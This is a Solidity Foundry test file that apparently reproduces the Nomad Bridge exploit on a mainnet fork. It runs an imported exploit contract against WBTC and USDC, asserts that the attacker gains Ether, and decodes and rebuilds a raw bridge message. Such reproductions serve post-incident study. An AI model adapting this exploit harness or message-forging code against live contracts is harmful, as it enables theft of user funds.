// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "./NomadBridgeExploit.sol";
import "./NomadBridge/Interfaces.sol";
import "./NomadBridge/TypedMemView.sol";
import "./NomadBridge/Message.sol";
import "./NomadBridge/BridgeMessage.sol";

contract NomadBridgeExploitTest is Test {
    using TypedMemView for bytes;
    using TypedMemView for bytes29;
    using BridgeMessage for bytes29;
    using Message for bytes29;

    address attackerAddress = address(10);
    NomadBridgeExploit exploit;

    ERC20 wbtc = ERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    ERC20 usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        vm.createSelectFork("mainnet", 15259100);
        exploit = new NomadBridgeExploit();
    }

    function testExploit() public {
        vm.startPrank(attackerAddress, attackerAddress);
        address[] memory tokens = new address[](2);
        tokens[0] = address(wbtc);
        tokens[1] = address(usdc);
        exploit.exploit(tokens);
        emit log_named_uint(
            "attacker's Ether balance", attackerAddress.balance / 1 ether
            );
        assertTrue(attackerAddress.balance > 0);
        vm.stopPrank();
    }

    function testParseAndReconstructMessage() public {
        bytes memory rawMessage =
            hex"6265616d00000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a300000002006574680000000000000000000000005d94309e5a0090b165fa4181519701637b6daeba006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000ce71065d4017f316ec606fe4422e11eb2c47c2460000000000000000000000000000000000000000000000000000000000000064e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a";

        bytes29 message = rawMessage.ref(0);
        emit log_named_uint("origin", message.origin());
        emit log_named_bytes32("sender", message.sender());
        emit log_named_uint("nonce", message.nonce());
        emit log_named_uint("destination", message.destination());
        emit log_named_bytes32("recipient", Message.recipient(message));
        emit log_named_address("recipientAddress", message.recipientAddress());

        bytes memory rawBridgeMessage = message.body().clone();
        bytes29 bridgeMessage = rawBridgeMessage.ref(0).mustBeMessage();
        bytes29 tokenId = bridgeMessage.tokenId();
        emit log_named_uint("domain", tokenId.domain());
        emit log_named_bytes32("id", tokenId.id());
        bytes29 action = bridgeMessage.action();
        emit log_named_uint("actionType", action.actionType());
        emit log_named_uint("isTransfer", action.isTransfer() ? 1 : 0);
        emit log_named_uint("isFastTransfer", action.isFastTransfer() ? 1 : 0);
        emit log_named_bytes32("recipient", BridgeMessage.recipient(action));
        emit log_named_address("evmRecipient", action.evmRecipient());
        emit log_named_uint("amnt", action.amnt());
        emit log_named_bytes32("detailsHash", action.detailsHash());

        // Reconstruct
        bytes29 action_ = BridgeMessage.formatTransfer(
            BridgeMessage.recipient(action), action.amnt(), action.detailsHash()
        );
        bytes29 tokenId_ =
            BridgeMessage.formatTokenId(tokenId.domain(), tokenId.id());
        bytes memory rawBridgeMessage_ =
            BridgeMessage.formatMessage(tokenId_, action_);
        assertEq(rawBridgeMessage, rawBridgeMessage_);
        bytes memory rawMessage_ = Message.formatMessage(
            message.origin(),
            message.sender(),
            message.nonce(),
            message.destination(),
            Message.recipient(message),
            rawBridgeMessage_
        );
        assertEq(rawMessage, rawMessage_);
    }
}
